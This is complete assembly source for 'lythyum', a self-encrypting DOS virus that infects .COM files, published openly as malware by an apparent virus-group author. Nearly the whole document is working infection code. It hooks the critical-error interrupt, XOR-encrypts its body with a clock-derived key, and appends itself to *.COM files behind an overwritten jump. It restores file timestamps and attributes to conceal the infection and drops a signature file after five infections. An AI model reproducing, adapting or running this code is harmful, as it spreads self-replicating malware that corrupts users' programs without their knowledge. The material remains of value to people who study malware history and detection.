;      |----------> lythyum <---------|      ...it keeps me under control...
;      |-> By The Attitude Adjuster <-|      ...it keeps me wired...
;      |------------> of <------------| ...it keeps me sane...
;      |-----> ViRuLeNT GRaFFiTi <----|         ...it keeps me crazy...

;
;      My Modem Ate My Mom
;

; I am publishing this code, not because it is any good, because it is pure
; shit (look at all the space filling SHIT that I did. I could've used proc
; calls instead of jmp's, etc etc etc), but because I feel the need to 
; expose the universe to a trillion bad lythyum hacks. (shit, lythyum and
; the radyum series are already shittily coded!)

; This virus does not in any way reflect my current level of coding ability.
; At the time that this code was written, I could not infect EXE, SYS or
; MBR's. I could not disinfect on the fly, and I sure as hell couldn't
; do a full drive/full system transversal.

ComStart        Equ     100h                            ; Where .COM's start

.model tiny
.code
          Org     100h

lythyum:                                                ; We begin... N0W!
        Jmp     VirStart

        MarkerWord      Dw      4343h                   ; Marks Virii!

VirStart:
        Push    Cx                                      ; Why?
        Call    GetDelta

GetDelta:
        Pop     Bp                                      ; Get offset off
        Sub     Bp, Offset GetDelta                     ; stack and fix it
        Call    Encrypt
        Jmp     AfterDelta

XorByte         Dw      00h                             ; XoR Byte

Encrypt:
        Lea     Si, [Offset AfterDelta+Bp]              ; Source and Dest.
        Mov     Di, Si                                  ; The Same!
        Mov     Cx, Iet                                 ; Number of Times
E_Loop_1:
        LodSw
        Xor     Ax, word ptr [Offset XorByte+Bp]
        StoSw
        Loop    E_Loop_1
        ret
        endp

WriteFile:
        Push    Cx
        Call    Encrypt
        Pop     Cx
        Mov     Ah,40h
        Int     21h
        Call    Encrypt
        ret
        endp

AfterDelta:
        xor     ax,ax                                   ; Interrupt Table
        mov     ds,ax                                   ; Segment 0000h
        Sti
        mov     bx, word ptr ds:[24h*4]                 ; Move the stuff
        mov     es, word ptr ds:[92h]                   ; From the table
        mov     word ptr Cs:[offset I_24_Seg+bp], es    ; Into my code!
        mov     word ptr Cs:[offset I_24_Ofs+bp], bx
        Cli
        Push    Cs                                      ; We need this
        Pop     Es                                      ; Back too!
        lea     dx, Cs:[offset int_24h_entry+bp]         ; Fix in my code
        Sti
        mov     word ptr ds:[24h*4], dx
        mov     word ptr ds:[92h], cs
        Cli
        Push    Cs                                      ; Restore Data
        Pop     Ds                                      ; Segment

        Lea     Si, [Offset VirBuf+Bp]                  ; Restore first
        Mov     Di, ComStart                            ; 5 bytes
        Mov     Cx, 5

Restore_Loop:
        LodSb                                           ; The physical
        StoSb                                           ; work goes right
        Loop    Restore_Loop

        Mov     Ah, 2ch                                 ; Get time!
        Int     21h
        Mov     word ptr [offset XorByte+Bp], dx        ; New Encryption Val

        Mov     Ah, 1ah                                 ; Set it to inside
        Lea     Dx, [offset VirDta+Bp]                  ; the virus
        Int     21h

        Mov     Ah, 4eh                                 ; Find First Match
Find_Loop:
        Mov     Cx, 3                                   ; ReadOnly+Hidden
        Lea     Dx, [Offset Pathname+Bp]                ; Point to *.*
        Int     21h

        Jnc     Cont                                    ; If fucked, leave!
        Jmp     Quit


Cont:
        Mov     ax, word ptr [offset VirTime+Bp]        ; Save Time
        Mov     word ptr [offset FTime+Bp], ax

        Mov     ax, word ptr [offset VirDate+Bp]        ; Date
        Mov     word ptr [offset FDate+Bp], ax

        Mov     Ax, 4300h                               ; Get Attrib
        Lea     Dx, [offset VirName+Bp]
        Int     21h
        Mov     byte ptr [offset FAttr+Bp], cl          ; And save it

        Cmp     word ptr [bp+VirSizeL], (0FA00H - VirLen)       ; Too big?
        Ja      NotGood

        Cmp     word ptr [bp+VirSizeL], 1FFH                    ; Too small?
        Jb      NotGood

        Mov     Ax, 4301h                               ; Set Attribs to
        Xor     Cx, Cx                                  ; zlich...
        Lea     Dx, [offset VirName+Bp]
        Int     21h
        Jc      RollOut

        Mov     Ax, 3d02h                               ; Open Read/Write
        Lea     Dx, [offset VirName+Bp]                 ; Point to name
        Int     21h

        Mov     word ptr [offset handle+bp], Ax         ; Store Handle

        Mov     Ah, 3fh                                 ; Read File
        Mov     Bx, word ptr [offset handle+bp]         ; Get Handle
        Mov     Cx, 5                                   ; 5 Bytes
        Lea     Dx, [offset VirBuf+Bp]                  ; Buffer Address
        Int     21h

        Cmp     word ptr [offset IdentBuf+Bp], 4343h
        Jne     Kont
        Mov     Cx, 0EF0h
        Jmp     RollOut

Kont:
        Mov     Ax, 4202h                               ; Move File Pointer
        Xor     Cx, Cx                                  ; 0 from relative
        Xor     Dx, Dx                                  ; end.
        Int     21h

        Push    Ax                                      ; Put file size
        Push    Dx                                      ; on stack

        Inc     Byte Ptr [Offset Count+Bp]

        Mov     Cx, VirLen                              ; Virus Length
        Lea     Dx, [Offset VirStart+bp]                ; From Start of
        Int     3
        Call    WriteFile

        Mov     Ax, 4200h                               ; Move to top
        Xor     Cx, Cx                                  ; Of file
        Xor     Dx, Dx
        Int     21h

        Pop     Dx                                      ; Retrieve file size
        Pop     Ax                                      ; From stack
        Sub     Ax, 2                                   ; Construct JMP
        Mov     word ptr [JmpDsp+Bp], Ax

        Mov     Ah, 40h                                 ; Write JMP to
        Mov     Cx, 5                                   ; Top of file...
        Lea     Dx, [Offset workarea+bp]
        Int     21h
        Jmp     Rollout

NotGood:
        Mov     Ah, 4Fh                                 ; Find next file.
        Jmp     Find_Loop

Rollout:
        Push    Cx                                      ; In Case

        Mov     Ax, 5701h                               ; Restore
        Mov     Cx, word ptr [offset FTime+Bp]          ; time
        Mov     Dx, word ptr [offset FDate+Bp]          ; and date
        Int     21h

        Mov     Ah, 3eh                                 ; Close file
        Int     21h

        Mov     Ax, 4301h                               ; Restore
        Xor     Cx, Cx
        Mov     Cl, byte ptr [offset FAttr+Bp]          ; Attributes
        Lea     Dx, [Offset VirName+Bp]
        Int     21h

        Pop     Cx                                      ; Get back
        Cmp     Cx, 0EF0h                               ; And check
        Je      NotGood

        Cmp     Byte Ptr [Offset Count+Bp],5
        Jne     Quit

        Mov     Ah, 3ch
        Lea     Dx, [Offset IdentFile+Bp]
        Mov     Cx, 2
        Int     21h

        Jc      QuitIt
        Mov     Bx, Ax

        Mov     Ah, 40h
        Mov     Cx, Yet
        Lea     Dx, [Offset Unmentionable+Bp]
        Int     21h

QuitIt:
        Mov     Ah, 3eh                                 ; Close File
        Int     21h

Quit:
        Mov     Ah, 1ah                                 ; Set to default
        Mov     Dx, offset 0080h                        ; DTA
        Int     21h

        Xor     Ax, Ax                                  ; Set back to
        Mov     Ds, Ax                                  ; Seg 0000h
        Mov     bx, word ptr [offset I_24_Ofs+bp]
        mov     es, word ptr [offset I_24_Seg+bp]

        Sti
        mov     word ptr ds:[24h*4], bx                 ; Restore old int 24
        mov     word ptr ds:[92h], es
        Cli

        Push    Cs                                      ; Restore SEGS
        Pop     Es
        Push    Cs                                      ; Both...
        Pop     Ds

        Pop     Cx
        Xor     Ax, Ax
        Xor     Bx, Bx
        Mov     Dx, offset 100h
        Push    Dx
        Ret     0FFFFh                                  ; Whoopy Shit

Int_24h_Entry   Proc    Far
        Mov     Ax, 3                                   ; Process Terminate
        Iret                                            ; Do a LOT, Eh?
        EndP

Unmentionable   db      0,'lythyum, the attitude adjuster, ViRuLeNT GRaFFiTi',0
Count           Db      0                               ; Infection Count
IdentFile       Db      '\lythyum.hi!',00               ; Ident File Name
PathName        Db      '*.COM',0                       ; File to get
VirBuf          Db      90h,90h,90h                     ; Storage Buffer
IdentBuf        Db      0CDh,20h                        ; Ident Check Buff
WorkArea        Db      0E9h
JmpDsp          Db      00h,00h                         ; Work on JMP
VirIdent        db      43h,43h

CodeEnd:
Handle          Dw      ?                       ; File Handle

I_24_Seg        Dw      ?                       ; Int 24h Seg
I_24_Ofs        Dw      ?                       ; Int 24h Offset

VirDta          Db      21 DUP(?)               ; Holds My DTA
VirAttr         Db      ?                       ; F I L E   A T T R
VirTime         Dw      ?                       ; F I L E   T I M E
VirDate         Dw      ?                       ; F I L E   D A T E
VirSizeL        Dw      ?                       ; F I L E   S I Z E   L O W
VirSizeH        Dw      ?                       ; F I L E   S I Z E   H I
VirName         db      13 DUP(?)               ; F I L E   N A M E

FAttr           db      ?
FTime           dw      ?
FDate           dw      ?

VirLen  = offset CodeEnd - offset Virstart
Iet     = offset(CodeEnd-Offset AfterDelta) / 2
Yet     = Offset Count - Offset Unmentionable

        End             lythyum

